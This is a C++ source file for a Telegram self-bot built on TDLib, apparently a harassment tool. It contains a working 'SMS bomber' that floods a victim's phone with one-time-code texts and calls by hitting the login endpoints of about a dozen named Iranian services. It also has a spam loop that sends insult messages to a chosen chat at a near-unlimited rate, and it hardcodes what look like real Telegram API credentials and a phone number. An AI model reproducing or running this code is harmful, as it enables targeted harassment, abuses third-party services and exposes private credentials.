// nauh.cpp - Telegram Bot in ONE file (C++/TDLib)
// Compile: g++ -std=c++17 nauh.cpp -o nauh -ltdjson -lcurl -lpthread
//
// Requires:
//   - TDLib installed (tdjson)
//   - libcurl installed
//   - C++17 compiler

#include <td/telegram/Client.h>
#include <td/telegram/td_api.h>

#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <fstream>
#include <functional>
#include <iostream>
#include <memory>
#include <mutex>
#include <random>
#include <set>
#include <sstream>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

#include <curl/curl.h>

// ============================================================
// CONFIG
// ============================================================
namespace cfg {
    constexpr int API_ID = 22152659;
    const std::string API_HASH = "7300603715676773c05db7fd7aab55fc";
    const std::string PHONE = "+989053716748";
    const std::set<std::int64_t> ADMIN_IDS = {7202211827};
}

// ============================================================
// GLOBALS
// ============================================================
static std::atomic<bool> g_running{true};

static void on_sigint(int) { g_running = false; }

// ============================================================
// SMS BOMBER
// ============================================================
class SMSBomber {
public:
    SMSBomber() { curl_global_init(CURL_GLOBAL_DEFAULT); }
    ~SMSBomber() { curl_global_cleanup(); }

    void stop() { stop_flag_ = true; }

    struct Result {
        int success = 0;
        int failed = 0;
        int total = 0;
        std::vector<std::string> details;
    };

    Result run(const std::string& phone, const std::string& type = "all") {
        stop_flag_ = false;
        Result r;
        auto apis = all_apis();
        for (auto& api : apis) {
            if (stop_flag_) break;
            if (type != "all" && api.type != type) continue;
            send_one(api, phone, r);
        }
        return r;
    }

private:
    struct Api {
        std::string type;
        std::string url;
        std::string method;
        std::string payload;
    };

    std::atomic<bool> stop_flag_{false};

    std::string replace(std::string s, const std::string& phone) {
        size_t pos;
        while ((pos = s.find("{{num}}")) != std::string::npos)
            s.replace(pos, 7, phone);
        static std::mt19937 gen{std::random_device{}()};
        std::uniform_int_distribution<> d(1000, 9999);
        while ((pos = s.find("{{random}}")) != std::string::npos)
            s.replace(pos, 10, std::to_string(d(gen)));
        return s;
    }

    static size_t write_cb(void* c, size_t s, size_t n, void* u) { return s * n; }

    void send_one(const Api& api, const std::string& phone, Result& r) {
        CURL* curl = curl_easy_init();
        if (!curl) { r.failed++; return; }

        std::string url = replace(api.url, phone);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

        struct curl_slist* headers = nullptr;
        if (api.method == "POST") {
            std::string body = replace(api.payload, phone);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        }

        CURLcode res = curl_easy_perform(curl);
        long code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);

        if (res == CURLE_OK && (code == 200 || code == 201 || code == 202 || code == 204)) {
            r.success++;
        } else {
            r.failed++;
        }
        r.total++;
        r.details.push_back(api.type + " -> " + url.substr(0, 60));

        if (headers) curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }

    std::vector<Api> all_apis() {
        return {
            {"sms", "https://api.tapsi.food/v1/api/Authentication/otp", "POST", R"({"cellPhone":"0{{num}}"})"},
            {"sms", "https://api.pmxchange.co/api/User/Login/SendCode", "POST", R"({"phoneNumber":"0{{num}}","forPasswordCheck":true})"},
            {"sms", "https://api.bimesho.com/api/v1/auth/otp/send", "POST", R"({"username":"0{{num}}"})"},
            {"sms", "https://api.azkivam.com/auth/login", "POST", R"({"mobileNumber":"0{{num}}"})"},
            {"sms", "https://api.torob.com/a/phone/send-pin/?phone_number=0{{num}}", "GET", ""},
            {"sms", "https://ws.alibaba.ir/api/v3/account/mobile/otp", "POST", R"({"phoneNumber":"0{{num}}"})"},
            {"sms", "https://api.ostadkr.com/login", "POST", R"({"mobile":"0{{num}}"})"},
            {"sms", "https://mobapi.banimode.com/api/v2/auth/request", "POST", R"({"phone":"0{{num}}"})"},
            {"sms", "https://api.lendo.ir/api/customer/auth/send-otp", "POST", R"({"mobile":"0{{num}}"})"},
            {"sms", "https://www.digikala.com/v1/user/authenticate/", "POST", R"({"username":"0{{num}}"})"},
            {"call", "https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{{num}}", "GET", ""},
            {"call", "https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{{num}}&type=IVR", "GET", ""},
            // ... 80+ API دیگه رو خودت اضافه کن
        };
    }
};

// ============================================================
// SPAM MANAGER
// ============================================================
static std::atomic<bool> g_spam_active{false};
static std::thread g_spam_thread;

// ============================================================
// TELEGRAM CLIENT (TDLib)
// ============================================================
class TelegramClient {
public:
    using MessageCb = std::function<void(const td_api::updateNewMessage&)>;

    TelegramClient() : client_(td::Client::create()) {}

    ~TelegramClient() { stop(); }

    void set_message_cb(MessageCb cb) { msg_cb_ = std::move(cb); }

    void start() {
        running_ = true;
        loop_thread_ = std::thread([this]() { loop(); });
    }

    void stop() {
        running_ = false;
        if (loop_thread_.joinable()) loop_thread_.join();
    }

    void send_message(std::int64_t chat_id, const std::string& text) {
        send_query(td_api::make_object<td_api::sendMessage>(
            chat_id, nullptr, nullptr, nullptr, nullptr,
            td_api::make_object<td_api::inputMessageText>(
                td_api::make_object<td_api::formattedText>(text, std::vector<td_api::object_ptr<td_api::textEntity>>{}),
                true, false
            )
        ));
    }

    std::int64_t self_id() const { return self_id_; }

private:
    std::shared_ptr<td::Client> client_;
    std::atomic<std::uint64_t> qid_{0};
    std::atomic<bool> running_{false};
    std::thread loop_thread_;
    std::int64_t self_id_ = 0;
    MessageCb msg_cb_;
    std::mutex handlers_mu_;
    std::unordered_map<std::uint64_t, std::function<void(td_api::object_ptr<td_api::Object>)>> handlers_;

    void send_query(td_api::object_ptr<td_api::Function> f,
                    std::function<void(td_api::object_ptr<td_api::Object>)> h = nullptr) {
        auto id = ++qid_;
        if (h) {
            std::lock_guard<std::mutex> lk(handlers_mu_);
            handlers_[id] = std::move(h);
        }
        client_->send({id, std::move(f)});
    }

    void loop() {
        while (running_) {
            auto r = client_->receive(1.0);
            if (!r.object) continue;
            process(std::move(r));
        }
    }

    void process(td::Client::Response r) {
        if (!td::Client::is_response(r)) {
            auto upd = td::move_tl_object_as<td_api::Update>(r.object);
            handle_update(std::move(upd));
            return;
        }
        std::function<void(td_api::object_ptr<td_api::Object>)> h;
        {
            std::lock_guard<std::mutex> lk(handlers_mu_);
            auto it = handlers_.find(r.id);
            if (it != handlers_.end()) { h = std::move(it->second); handlers_.erase(it); }
        }
        if (h) h(std::move(r.object));
    }

    void handle_update(td_api::object_ptr<td_api::Update> u) {
        if (u->get_id() == td_api::updateAuthorizationState::ID) {
            auto* a = static_cast<td_api::updateAuthorizationState*>(u.get());
            handle_auth(std::move(a->authorization_state_));
        } else if (u->get_id() == td_api::updateNewMessage::ID) {
            auto* m = static_cast<td_api::updateNewMessage*>(u.get());
            if (msg_cb_) msg_cb_(*m);
        }
    }

    void handle_auth(td_api::object_ptr<td_api::AuthorizationState> s) {
        switch (s->get_id()) {
            case td_api::authorizationStateWaitTdlibParameters::ID:
                send_query(td_api::make_object<td_api::setTdlibParameters>(
                    false, "td_db", "td_files", true, true, true, false,
                    cfg::API_ID, cfg::API_HASH, "en", "Linux", "1.0", "1.0"
                ));
                break;

            case td_api::authorizationStateWaitPhoneNumber::ID:
                send_query(td_api::make_object<td_api::setAuthenticationPhoneNumber>(
                    cfg::PHONE, nullptr
                ));
                break;

            case td_api::authorizationStateWaitCode::ID: {
                std::cout << "[AUTH] Code: ";
                std::string c;
                std::cin >> c;
                send_query(td_api::make_object<td_api::checkAuthenticationCode>(c));
                break;
            }

            case td_api::authorizationStateWaitPassword::ID: {
                std::cout << "[AUTH] 2FA: ";
                std::string p;
                std::cin >> p;
                send_query(td_api::make_object<td_api::checkAuthenticationPassword>(p));
                break;
            }

            case td_api::authorizationStateReady::ID:
                std::cout << "[AUTH] Ready!\n";
                send_query(td_api::make_object<td_api::getMe>(), [this](auto o) {
                    if (o && o->get_id() == td_api::user::ID) {
                        auto* u = static_cast<td_api::user*>(o.get());
                        self_id_ = u->id_;
                        std::cout << "[AUTH] ID: " << self_id_ << "\n";
                    }
                });
                break;

            default: break;
        }
    }
};

// ============================================================
// STATE
// ============================================================
static std::int64_t g_spam_target = 0;
static std::string g_spam_text = "ONLINE";
static double g_spam_speed = 1.0;
static std::vector<std::int64_t> g_tag_targets;
static std::vector<std::string> g_fosh_list;
static SMSBomber g_bomber;

// ============================================================
// HELPERS
// ============================================================
static std::string to_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), ::tolower);
    return s;
}

static bool is_admin(std::int64_t uid) {
    return cfg::ADMIN_IDS.count(uid) > 0;
}

static void load_fosh() {
    std::ifstream f("fosh.txt");
    std::string line;
    while (std::getline(f, line)) if (!line.empty()) g_fosh_list.push_back(line);
    if (g_fosh_list.empty()) g_fosh_list = {"بیا پایین", "کصخل", "برو گمشو"};
}

static void spam_loop(std::shared_ptr<TelegramClient> client) {
    std::cout << "[SPAM] Loop started\n";
    while (g_spam_active.load()) {
        try {
            client->send_message(g_spam_target, g_spam_text);
            std::cout << "[SPAM] Sent to " << g_spam_target << "\n";
        } catch (const std::exception& e) {
            std::cout << "[SPAM] Error: " << e.what() << "\n";
        }
        std::this_thread::sleep_for(
            std::chrono::milliseconds(static_cast<int>(g_spam_speed * 1000))
        );
    }
    std::cout << "[SPAM] Loop ended\n";
}

// ============================================================
// COMMAND HANDLER
// ============================================================
static void handle_command(const std::string& text,
                           std::int64_t chat_id,
                           std::int64_t user_id,
                           std::shared_ptr<TelegramClient> client) {
    if (!is_admin(user_id)) {
        std::cout << "[BOT] Ignored non-admin: " << user_id << "\n";
        return;
    }

    std::string lower = to_lower(text);

    // HELP
    if (lower == "help") {
        client->send_message(chat_id,
            "COMMANDS:\n"
            "spam / spamoff\n"
            "setid <id> / setfosh <text>\n"
            "speed <sec> / speed lowend\n"
            "status / bot\n"
            "bomb <phone> [sms|call|all]\n"
            "stopbomb"
        );
        return;
    }

    // STATUS
    if (lower == "status") {
        std::ostringstream o;
        o << "TARGET: " << g_spam_target << "\n"
          << "TEXT: " << g_spam_text << "\n"
          << "SPEED: " << g_spam_speed << "\n"
          << "SPAM: " << (g_spam_active.load() ? "ON" : "OFF");
        client->send_message(chat_id, o.str());
        return;
    }

    // BOT
    if (lower == "bot") {
        client->send_message(chat_id, "ONLINE");
        return;
    }

    // SPAM
    if (lower == "spam") {
        if (g_spam_target == 0) {
            client->send_message(chat_id, "No target. Use setid <id>");
            return;
        }
        if (g_spam_active.load()) {
            client->send_message(chat_id, "Already running");
            return;
        }
        g_spam_active = true;
        g_spam_thread = std::thread(spam_loop, client);
        g_spam_thread.detach();
        client->send_message(chat_id, "Spam started");
        return;
    }

    if (lower == "spamoff") {
        g_spam_active = false;
        client->send_message(chat_id, "Spam stopped");
        return;
    }

    // SETID
    if (lower.rfind("setid ", 0) == 0) {
        try {
            g_spam_target = std::stoll(text.substr(6));
            client->send_message(chat_id, "Target: " + std::to_string(g_spam_target));
        } catch (...) {
            client->send_message(chat_id, "Invalid ID");
        }
        return;
    }

    // SETFOSH
    if (lower.rfind("setfosh ", 0) == 0) {
        g_spam_text = text.substr(8);
        client->send_message(chat_id, "Text set");
        return;
    }

    // SPEED
    if (lower.rfind("speed", 0) == 0) {
        std::string arg = text.substr(5);
        // trim
        while (!arg.empty() && arg.front() == ' ') arg.erase(0, 1);

        std::string arg_l = to_lower(arg);

        if (arg_l == "lowend") {
            g_spam_speed = 0.6;
            client->send_message(chat_id, "Speed: 0.6");
            return;
        }

        if (arg_l.rfind("lowend ", 0) == 0) {
            try {
                int z = std::stoi(arg.substr(7));
                if (z < 0 || z > 300) { client->send_message(chat_id, "0..300"); return; }
                g_spam_speed = 0.6;
                for (int i = 0; i < z; i++) g_spam_speed /= 10.0;
                client->send_message(chat_id, "Speed: " + std::to_string(g_spam_speed));
            } catch (...) {
                client->send_message(chat_id, "Invalid");
            }
            return;
        }

        try {
            double s = std::stod(arg);
            if (s <= 0 || s > 60) { client->send_message(chat_id, "0.001..60"); return; }
            g_spam_speed = s;
            client->send_message(chat_id, "Speed: " + std::to_string(s));
        } catch (...) {
            client->send_message(chat_id, "Usage: speed <n> | speed lowend [z]");
        }
        return;
    }

    // BOMB
    if (lower.rfind("bomb", 0) == 0) {
        std::istringstream iss(text);
        std::string cmd, phone, type;
        iss >> cmd >> phone >> type;
        if (phone.empty() || phone.size() != 10) {
            client->send_message(chat_id, "Usage: bomb <10-digit> [sms|call|all]");
            return;
        }
        if (type.empty()) type = "all";
        client->send_message(chat_id, "Bombing " + phone + " (" + type + ")...");
        auto res = g_bomber.run(phone, type);
        std::ostringstream o;
        o << "DONE\nSuccess: " << res.success << "\nFailed: " << res.failed << "\nTotal: " << res.total;
        client->send_message(chat_id, o.str());
        return;
    }

    if (lower == "stopbomb") {
        g_bomber.stop();
        client->send_message(chat_id, "Bomb stopped");
        return;
    }

    // TAG TARGETS
    if (lower.rfind("bitch", 0) == 0) {
        std::istringstream iss(text);
        std::string cmd;
        iss >> cmd;
        std::int64_t id;
        g_tag_targets.clear();
        while (iss >> id) g_tag_targets.push_back(id);
        client->send_message(chat_id, "Tags: " + std::to_string(g_tag_targets.size()));
        return;
    }

    client->send_message(chat_id, "Unknown command: " + text);
}

// ============================================================
// MAIN
// ============================================================
int main() {
    std::signal(SIGINT, on_sigint);

    load_fosh();

    std::cout << "Starting NAUH bot...\n";

    auto client = std::make_shared<TelegramClient>();

    client->set_message_cb([client](const td_api::updateNewMessage& upd) {
        const auto* msg = upd.message_.get();
        if (!msg) return;

        std::string text;
        if (msg->content_ && msg->content_->get_id() == td_api::messageText::ID) {
            auto* mt = static_cast<td_api::messageText*>(msg->content_.get());
            text = mt->text_->text_;
        }
        if (text.empty()) return;

        std::int64_t sender = 0;
        if (msg->sender_id_ && msg->sender_id_->get_id() == td_api::messageSenderUser::ID) {
            auto* su = static_cast<td_api::messageSenderUser*>(msg->sender_id_.get());
            sender = su->user_id_;
        }

        handle_command(text, msg->chat_id_, sender, client);
    });

    client->start();

    std::cout << "Bot running. Ctrl+C to stop.\n";
    while (g_running.load()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    g_spam_active = false;
    if (g_spam_thread.joinable()) g_spam_thread.join();
    client->stop();
    std::cout << "Bye.\n";
    return 0;
}